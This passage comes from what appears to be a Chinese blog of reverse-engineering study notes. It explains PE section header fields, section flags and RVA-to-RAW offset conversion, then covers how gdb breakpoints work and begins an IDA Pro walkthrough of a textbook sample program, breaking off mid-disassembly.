class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress;</span><br><span class="line">DWORD VirtualSize;</span><br><span class="line">     &#125; Misc;</span><br><span class="line">     DWORD VirtualAddress;</span><br><span class="line">     DWORD SizeOfRawData;</span><br><span class="line">     DWORD PointerToRawData;</span><br><span class="line">     DWORD PointerToRelocations;</span><br><span class="line">     DWORD PointerToLinenumbers;</span><br><span class="line">     WORD NumberOfRelocations;</span><br><span class="line">     WORD NumberOfLinenumbers;</span><br><span class="line">     DWORD Characteristics;</span><br><span class="line">   &#125; IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
<h4 id="nameimage_sizeof_short_name">Name[IMAGE_SIZEOF_SHORT_NAME]</h4>
<p>节区名称,其中<code>#define IMAGE_SIZEOF_SHORT_NAME 8</code>,即名称最长不得超过8字节</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711212317715.png"
alt="image-20220711212317715" />
<figcaption aria-hidden="true">image-20220711212317715</figcaption>
</figure>
<p>010editor给出的注释是"可以不以0结尾",这与我们平时使用的字符串以<code>'\0'</code>结尾不同</p>
<p>原因是Name无足轻重,机器不关心节叫啥,只关心节的排列顺序</p>
<h4 id="physicaladdressvirtualsize">PhysicalAddress&amp;VirtualSize</h4>
<p>哥俩生异型啊,连体婴儿是吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	DWORD PhysicalAddress;</span><br><span class="line">	DWORD VirtualSize;</span><br><span class="line">&#125; Misc;</span><br></pre></td></tr></table></figure>
<h5 id="virtualaddress">VirtualAddress</h5>
<p>节在进程加载进入虚拟地址空间之后的相对虚拟地址</p>
<h5 id="sizeofrawdata">SizeOfRawData</h5>
<p>节大小</p>
<p>根据相对虚拟地址和节大小就可以确定节在虚存中的范围</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714233554055.png"
alt="image-20220714233554055" />
<figcaption aria-hidden="true">image-20220714233554055</figcaption>
</figure>
<p>在notepad.exe中VirtualAddress=1000h,则绝对虚拟地址就是1001000,</p>
<p>大小是6E00h,则节的范围就是0x1001000h~0x1007E00h</p>
<p>这个范围中,最开始是.idata节,然后是.text节</p>
<h5 id="pointertorawdata">PointerToRawData</h5>
<p>节在磁盘文件中的起始地址</p>
<h5 id="pointertorelocations">PointerToRelocations</h5>
<p>重定位使用,在exe中该值无用,在可重定位目标模块.</p>
<p>obj中该值指向IMAGE_RELOCATION 结构体,重定位要用</p>
<p>具体怎么重定位,需要学习核心原理第16章</p>
<h5 id="pointertolinenumbers">PointerToLinenumbers</h5>
<p>行号表指针,调试使用</p>
<h5 id="numberofrelocations">NumberOfRelocations</h5>
<p>obj中该值作为下标,指向<strong>重定位</strong>表对应该节的表项</p>
<h5 id="characteristics-1">Characteristics</h5>
<p>枚举值,节属性,起保护作用,多个属性则按位或</p>
<table>
<colgroup>
<col style="width: 43%" />
<col style="width: 56%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Flag</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">0x00000000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x00000001</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x00000002</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td style="text-align: left;">0x00000004</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_TYPE_NO_PAD</strong>0x00000008</td>
<td style="text-align: left;">The section should not be padded to the
next boundary. This flag is obsolete and is replaced by
IMAGE_SCN_ALIGN_1BYTES.</td>
</tr>
<tr>
<td style="text-align: left;">0x00000010</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_CNT_CODE</strong>0x00000020</td>
<td style="text-align: left;">The section contains executable code.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_CNT_INITIALIZED_DATA</strong>0x00000040</td>
<td style="text-align: left;">The section contains initialized
data.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_CNT_UNINITIALIZED_DATA</strong>0x00000080</td>
<td style="text-align: left;">The section contains uninitialized
data.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_LNK_OTHER</strong>0x00000100</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_LNK_INFO</strong>0x00000200</td>
<td style="text-align: left;">The section contains comments or other
information. This is valid only for object files.</td>
</tr>
<tr>
<td style="text-align: left;">0x00000400</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_LNK_REMOVE</strong>0x00000800</td>
<td style="text-align: left;">The section will not become part of the
image. This is valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_LNK_COMDAT</strong>0x00001000</td>
<td style="text-align: left;">The section contains COMDAT data. This is
valid only for object files.</td>
</tr>
<tr>
<td style="text-align: left;">0x00002000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_NO_DEFER_SPEC_EXC</strong>0x00004000</td>
<td style="text-align: left;">Reset speculative exceptions handling bits
in the TLB entries for this section.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_GPREL</strong>0x00008000</td>
<td style="text-align: left;">The section contains data referenced
through the global pointer.</td>
</tr>
<tr>
<td style="text-align: left;">0x00010000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_PURGEABLE</strong>0x00020000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_LOCKED</strong>0x00040000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_PRELOAD</strong>0x00080000</td>
<td style="text-align: left;">Reserved.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_1BYTES</strong>0x00100000</td>
<td style="text-align: left;">Align data on a 1-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_2BYTES</strong>0x00200000</td>
<td style="text-align: left;">Align data on a 2-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_4BYTES</strong>0x00300000</td>
<td style="text-align: left;">Align data on a 4-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_8BYTES</strong>0x00400000</td>
<td style="text-align: left;">Align data on a 8-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_16BYTES</strong>0x00500000</td>
<td style="text-align: left;">Align data on a 16-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_32BYTES</strong>0x00600000</td>
<td style="text-align: left;">Align data on a 32-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_64BYTES</strong>0x00700000</td>
<td style="text-align: left;">Align data on a 64-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_128BYTES</strong>0x00800000</td>
<td style="text-align: left;">Align data on a 128-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_256BYTES</strong>0x00900000</td>
<td style="text-align: left;">Align data on a 256-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_512BYTES</strong>0x00A00000</td>
<td style="text-align: left;">Align data on a 512-byte boundary. This is
valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_1024BYTES</strong>0x00B00000</td>
<td style="text-align: left;">Align data on a 1024-byte boundary. This
is valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_2048BYTES</strong>0x00C00000</td>
<td style="text-align: left;">Align data on a 2048-byte boundary. This
is valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_4096BYTES</strong>0x00D00000</td>
<td style="text-align: left;">Align data on a 4096-byte boundary. This
is valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_ALIGN_8192BYTES</strong>0x00E00000</td>
<td style="text-align: left;">Align data on a 8192-byte boundary. This
is valid only for object files.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_LNK_NRELOC_OVFL</strong>0x01000000</td>
<td style="text-align: left;">The section contains extended relocations.
The count of relocations for the section exceeds the 16 bits that is
reserved for it in the section header. If the
<strong>NumberOfRelocations</strong> field in the section header is
0xffff, the actual relocation count is stored in the
<strong>VirtualAddress</strong> field of the first relocation. It is an
error if IMAGE_SCN_LNK_NRELOC_OVFL is set and there are fewer than
0xffff relocations in the section.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_DISCARDABLE</strong>0x02000000</td>
<td style="text-align: left;">The section can be discarded as
needed.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_NOT_CACHED</strong>0x04000000</td>
<td style="text-align: left;">The section cannot be cached.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_NOT_PAGED</strong>0x08000000</td>
<td style="text-align: left;">The section cannot be paged.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_SHARED</strong>0x10000000</td>
<td style="text-align: left;">The section can be shared in memory.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_EXECUTE</strong>0x20000000</td>
<td style="text-align: left;">The section can be executed as code.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_READ</strong>0x40000000</td>
<td style="text-align: left;">The section can be read.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>IMAGE_SCN_MEM_WRITE</strong>0x80000000</td>
<td style="text-align: left;">The section can be written to.</td>
</tr>
</tbody>
</table>
<p>比如notepad.exe中的text节</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714232136762.png"
alt="image-20220714232136762" />
<figcaption aria-hidden="true">image-20220714232136762</figcaption>
</figure>
<p>其中开启了三个标志</p>
<p>节包含代码,节可执行,节可读</p>
<p>其他的都不可,比如节不可写</p>
<h2 id="rva-to-raw">RVA to RAW</h2>
<p>这一部分010editor已经帮我们算好了</p>
<p>可执行文件要运行时,首先要装载进入虚拟内存.</p>
<p>这个映射过程不是简单的找一个<code>ImageBase</code>然后照搬磁盘中的文件到虚拟内存就完了</p>
<p>诚如是则文件中和内存中该文件应该一样大.</p>
<p>而实际上节区有各种对齐要求,因此虚拟内存中的文件映像往往更大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710144537819.png"
alt="image-20220710144537819" />
<figcaption aria-hidden="true">image-20220710144537819</figcaption>
</figure>
<p>从<code>notepad.exe</code>的例子上可以看出,PE头部分确实是找一个<code>ImageBase</code>然后原封不动照搬的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710145018095.png"
alt="image-20220710145018095" />
<figcaption aria-hidden="true">image-20220710145018095</figcaption>
</figure>
<p>文件在磁盘中存放时,基地址是0,搬到内存中假设映像基地址是<code>ImageBase=0x1000000</code></p>
<p>可想而知,NT头如果在文件中的偏移量是<code>0xE0</code>则映射到进程地址空间中的虚拟地址就是<code>ImageBase+0xE0=0x10000E0</code></p>
<p>可是后来的节区就得根据对齐要求来了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710145058360.png"
alt="image-20220710145058360" />
<figcaption aria-hidden="true">image-20220710145058360</figcaption>
</figure>
<p>这个转化关系是什么呢?</p>
<p>权位指南上给出的算法是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710155642134.png"
alt="image-20220710155642134" />
<figcaption aria-hidden="true">image-20220710155642134</figcaption>
</figure>
<p>我看了好半天没看明白,</p>
<p>原因一是VirtualAddress和书上先前给出的符号意义不同造成了混淆,</p>
<p>二是对符号的定义没有完全理解,</p>
<p>下面复习一下这几个符号的意义并推导这个计算公式</p>
<p>要利用到<code>_IMAGE_SECTION_HEADER</code>头中的<code>PointerToRawData,VirtualAddress,SizeOfRawData</code>这几个值</p>
<p>复习一下这几个值的含义</p>
<p><code>PointerToRawData</code>:磁盘文件中节区的起始位置,由于文件的起始地址为0,那么PointerToRawData也就是节区基地址相对于0的偏移量,也就是RAW</p>
<p><code>VirtualAddress</code>(不要被名字迷惑):RVA,即虚拟地址空间中相对于映像基址ImageBase的偏移量</p>
<blockquote>
<p>这里一定要区分清楚VirualAddress和VA</p>
<p>VirtualAddress是定义在节头中的成员,实际上表示的是RVA,因为进程不到装载是不知掉其ImageBase在哪里的</p>
<p>VA=RVA+ImageBase=VirtualAddress+ImageBase</p>
</blockquote>
<p><code>SizeOfRawData</code>:本节区的大小</p>
<p>不管是躺在文件中还是站在内存里,<code>SizeOfRawData</code>大小永远不变,即一个节中间不会随便插入空隙</p>
<p>比如对于data节,</p>
<p><code>PointerToRawData=0x7C00</code></p>
<p><code>ImageBase=0x1000000</code></p>
<p><code>VA=0x1009000=ImageBase+RVA</code>得到<code>VirtualAddress=RVA=0x9000</code></p>
<p>那么对于任意一个节区在虚拟内存中的起始地址,减去其节头中的成员<code>VirtualAddress</code>就得到<code>ImageBase</code>,</p>
<p><strong>假设</strong></p>
<p><code>VA(x),RVA(x)</code>分别表示符号x在虚拟地址空间中的实际地址和相对于<code>ImageBase</code>的偏移量</p>
<p><code>RAW(x)</code>表示符号x在文件中的偏移量</p>
<p>假设<code>section</code>表示任意节</p>
<p><code>section.VirtualAddress</code>表示该节节头中的<code>VirtualAddress</code>成员</p>
<p><code>section.PointerToRawData</code>表示该节节头中的<code>PointerToRawData</code>成员</p>
<p>显然对于节区有</p>
<p><code>RVA(section)=section.VirtualAddress</code></p>
<p><code>RAW(section)=section.PointerToRawData</code></p>
<p>现在考虑对于任意符号<code>x</code>,给定其虚拟地址空间中的实际地址<code>VA(x)</code>,其RVA和<code>RAW</code>怎样计算呢?</p>
<p><code>ImageBase</code>装载后就知道了,因此可以轻松得到<code>RVA(x)=VA(x)-ImageBase</code></p>
<p>由于每个节的<code>RVA(section)=section.VirtualAddress</code>也是已知的,该节的大小<code>section.SizeOfRawData</code>也是已知的,那么可以得到</p>
<p>第i个节(假设节按照地址递增编号0到n)<code>section[i]</code>管理的相对虚拟地址范围是</p>
<p><code>[section.VirtualAddress, section.VirtualAddress+section[i].SizeOfRawData)</code></p>
<p>如果<code>RVA(x)</code>,说明x根本没有落在节区,甚至还没有出PE头,</p>
<p>而前面分析过了,PE头装载进入虚拟内存就是加了一个<code>ImageBase</code>,因此此时<code>RAW(x)=RVA(x)</code></p>
<p>否则,x落在了节区,需要先判断x落在了哪个节,咋判断呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in [0,n]</span><br><span class="line">	if(RVA(x)&gt;=section[i].VirtualAddress &amp;&amp; RVA(x)&lt; section[i].ViritualAddress+section[i].SizeOfRawData)</span><br><span class="line">		then x is located in section[i]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这就好比一层楼高3米,我闭着眼爬楼爬了8米,问我现在的位置?</p>
<p>一楼[0,3),二楼[3,6),三楼[6,9)</p>
<p>8在[6,9)这个范围内,因此我在3楼</p>
</blockquote>
<p>假设根据刚才的算法,已经知道了x落在<code>section[i]</code>,</p>
<p>那么<strong>x相对于该节起始位置的偏移量</strong>就是<code>RVA(x)-section[i].VirtualAddress</code></p>
<p>显然在文件中,x相对于其所在节的偏移量也是这个数,这就好比058班的sjf考数据结构时班内考号是4,换个教室考C++时班内考号还是4</p>
<p>因此得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAW(x)-section[i].PointerToRawData=RVA(x)-section[i].VirtualAddress</span><br></pre></td></tr></table></figure>
<p>移项有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAW(x)=RVA(x)-section[i].VirtualAddress+section[i].PointerToRawData</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这就和权威指南给出的公式很像了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710160314871.png"
alt="image-20220710160314871" />
<figcaption aria-hidden="true">image-20220710160314871</figcaption>
</figure>
</blockquote>
<p><strong>上述过程可以总结为:</strong></p>
<p>1.查x落在哪个节区</p>
<p>2.查x相对于该节区的偏移量</p>
<p>3.节区相对于文件基地址的偏移量+x相对于该节区的偏移量=x相对于文件基地址的偏移量</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/07/%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/07/%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">binarybook-chapter1-调试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-07 20:19:00" itemprop="dateCreated datePublished" datetime="2022-07-07T20:19:00+08:00">2022-07-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-09 18:10:26" itemprop="dateModified" datetime="2022-07-09T18:10:26+08:00">2022-07-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="binarybook-chapter1-调试">binarybook-chapter1-调试</h1>
<p>原来我只会用devc++,调试只会用cout打印变量观察,我就是个傻懒子</p>
<h2 id="调试原理">调试原理</h2>
<p>以gdb调试器为例,参考<a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/336922639">原来gdb的底层调试原理这么简单
- 知乎 (zhihu.com)</a></p>
<p>大体意思是:</p>
<p>gbd进程会调用fork函数创建一个子进程,该子进程会调用ptrace函数,让父进程gdb进程托管其所有的信号,然后子进程execv需要调试的程序,</p>
<figure>
<img
src="https://pic1.zhimg.com/80/v2-e446d2632631895dc401d7899d7e7a24_1440w.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>如此该程序将完全处在gdb父进程的掌控之下</p>
<figure>
<img
src="https://pic3.zhimg.com/80/v2-27b78b3fc43dda54599d0d116a0b5a86_1440w.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>断点的原理:</p>
<p>gbd进程维护一个断点链表,</p>
<p>gdb进程将我们要下断点的指定行保存在断点列表,然后用int
3中断指令替换断点行指令(字节不足则补nop)</p>
<p>当子进程运行到断点处时执行一个int
3指令,操作系统原本应该向该子进程发送一个SIGTRAP指令让其陷入内核,但是这一信号被父进程gdb截胡了</p>
<p>此时子进程中的int 3已经执行过了,eip指向了下一条指令</p>
<p>现在轮到父进程登场了</p>
<p>父进程gdb收到了SIGTRAP指令,发现是子进程的哪一行引起了中断指令,然后去断点链表找到对应行的记录,再给子进程该回去,然后将子进程的eip程序计数器退一步,让子进程重新执行</p>
<p>这么麻烦实现了一个什么功能呢?</p>
<p>子进程会在断点处int
3指令停下等待信号,这就给了父进程趁机读写子进程堆栈和寄存器的机会</p>
<h2 id="ida-pro静态观察wsample01b.exe">IDA
pro静态观察wsample01b.exe</h2>
<p>例程来自有趣的二进制<a
target="_blank" rel="noopener" href="https://github.com/kenjiaiko/binarybook">kenjiaiko/binarybook
(github.com)</a></p>
<h3 id="winmain函数的行为">winmain函数的行为</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080 ; int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)</span><br><span class="line">.text:00401080 _wWinMain@16    proc near               ; CODE XREF: ___tmainCRTStartup+153↓p</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 hInstance       = dword ptr  4</span><br><span class="line">.text:00401080 hPrevInstance   = dword ptr  8</span><br><span class="line">.text:00401080 lpCmdLine       = dword ptr  0Ch</span><br><span class="line">.text:00401080 nShowCmd        = dword ptr  10h</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080                 call    sub_401000      ; 上来西安调用函数</span><br><span class="line">.text:00401080                                         ;</span><br><span class="line">.text:00401085                 push    0               ; uType   </span><br><span class="line">.text:00401087                 push    offset Caption  ; &quot;MESSAGE&quot;		;Caption在rdata区,offset伪指令取了它的地址</span><br><span class="line">.text:0040108C                 push    offset Text     ; &quot;Copied!&quot;</span><br><span class="line">.text:00401091                 call    ds:GetActiveWindow</span><br><span class="line">.text:00401097                 push    eax             ; hWnd	;eax承载的是GetActiveWindow的返回值,一个窗口句柄,压栈做参数</span><br><span class="line">.text:00401098                 call    ds:MessageBoxW	;调用MessageBoxW,向屏幕显示对话框</span><br><span class="line">.text:0040109E                 xor     eax, eax		;eax置零</span><br><span class="line">.text:004010A0                 retn    10h			;winmain返回值10h</span><br><span class="line">.text:004010A0 _wWinMain@16    endp</span><br></pre></td></tr></table></figure>
<p>暂且不管sub_401000函数干了啥,先看一下后面的win32API干了啥</p>
<blockquote>
<p>GetActiveWindow</p>
<p>该函数可以获得与调用线程的消息队列相关的活动窗口的窗口句柄。</p>
<p>函数原型:<code>HWND GetActiveWindow（VOID）</code></p>
<p>参数：无</p>
<p>返回值：返回值是与调用线程的消息队列相关的活动窗口的句柄。否则，返回值为NULL。</p>
</blockquote>
<p>既然GetActiveWindow不需要参数,那么前面三个push压栈是为谁准备的参数呢?</p>
<p>GetActiveWindow调用前后,在主函数中看栈帧没有变化,从栈顶向栈底还是&amp;Text,&amp;Caption,0</p>
<p>然后又将eax压栈,而eax存放的是GetActiveWindow的返回值,一个窗口句柄(如果失败则为NULL)</p>
<p>现在栈上压了四个参数,下面要调用MessageBoxW了</p>
<blockquote>
<p>函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MessageBoxW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HWND    hWnd,</span></span><br><span class="line"><span class="params">  [in, optional] LPCWSTR lpText,</span></span><br><span class="line"><span class="params">  [in, optional] LPCWSTR lpCaption,</span></span><br><span class="line"><span class="params">  [in]           UINT    uType</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>hWnd:一个窗口句柄</p>
<p>lpText:要在窗口中打印展示的文本</p>
<p>lpCaption:窗口标题</p>
<p>uType:指定对话框的内容和行为</p>
<table>
<colgroup>
<col style="width: 28%" />
<col style="width: 4%" />
<col style="width: 66%" />
</colgroup>
<thead>
<tr>
<th>宏定义</th>
<th>值</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>MB_OK</strong></td>
<td>0</td>
<td>窗口只有一个OK按钮,默认模式</td>
</tr>
<tr>
<td><strong>MB_OKCANCEL</strong></td>
<td>1</td>
<td>窗口有两个按钮,分别是OK和Cancel</td>
</tr>
<tr>
<td><strong>MB_ABORTRETRYIGNORE</strong></td>
<td>2</td>
<td>窗口有三个按钮,分别是Abort,Retry,Ignore(放弃,重试,忽略)</td>
</tr>
<tr>
<td><strong>MB_YESNOCANCEL</strong></td>
<td>3</td>
<td>窗口有三个按钮,分别是Yes,No,Cancle</td>
</tr>
<tr>
<td><strong>MB_YESNO</strong></td>
<td>4</td>
<td>窗口有两个按钮,Yes,No</td>
</tr>
<tr>
<td><strong>MB_RETRYCANCEL</strong></td>
<td>5</td>
<td>...</td>
</tr>
<tr>
<td><strong>MB_CANCELTRYCONTINUE</strong></td>
<td>6</td>
<td>...</td>
</tr>
<tr>
<td>...</td>
<td>..</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>还有很多定义好的窗口样式,现在不用管</p>
<p>返回值:int,返回用户点击的按钮号</p>
<table>
<thead>
<tr>
<th>宏定义</th>
<th>按钮号</th>
<th>按钮</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>IDOK</strong></td>
<td>1</td>
<td>OK</td>
</tr>
<tr>
<td><strong>IDCANCEL</strong></td>
<td>2</td>
<td>Cancel</td>
</tr>
<tr>
<td><strong>IDABORT</strong></td>
<td>3</td>
<td>Abort</td>
</tr>
<tr>
<td>...</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>为啥要返回用户点选的按钮号呢?方便程序后续提供用户希望的服务,</p>
<p>比如当用户点选了Ok则确认并提交了一些信息,点选了Cancel则关闭窗口或者取消了一些信息</p>
</blockquote>
<p>例程运行之后的窗口是这样的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707095841614.png"
alt="image-20220707095841614" />
<figcaption aria-hidden="true">image-20220707095841614</figcaption>
</figure>
<p>可以说这个win32窗口啥正事也没干</p>
<h3 id="sub_401000函数的行为">sub_401000函数的行为</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: wWinMain(x,x,x,x)↓p</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 Filename        = word ptr -2004h</span><br><span class="line">.text:00401000 pszPath         = word ptr -1004h</span><br><span class="line">.text:00401000 var_4           = dword ptr -4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 mov     eax, 2004h</span><br><span class="line">.text:00401008                 call    __alloca_probe</span><br><span class="line">.text:0040100D                 mov     eax, ___security_cookie</span><br><span class="line">.text:00401012                 xor     eax, ebp</span><br><span class="line">.text:00401014                 mov     [ebp+var_4], eax</span><br><span class="line">.text:00401017                 push    1000h           ; nSize</span><br><span class="line">.text:0040101C                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00401022                 push    eax             ; lpFilename</span><br><span class="line">.text:00401023                 push    0               ; hModule</span><br><span class="line">.text:00401025                 call    ds:GetModuleFileNameW</span><br><span class="line">.text:0040102B                 lea     ecx, [ebp+pszPath]</span><br><span class="line">.text:00401031                 push    ecx             ; pszPath</span><br><span class="line">.text:00401032                 push    0               ; dwFlags</span><br><span class="line">.text:00401034                 push    0               ; hToken</span><br><span class="line">.text:00401036                 push    7               ; csidl</span><br><span class="line">.text:00401038                 push    0               ; hwnd</span><br><span class="line">.text:0040103A                 call    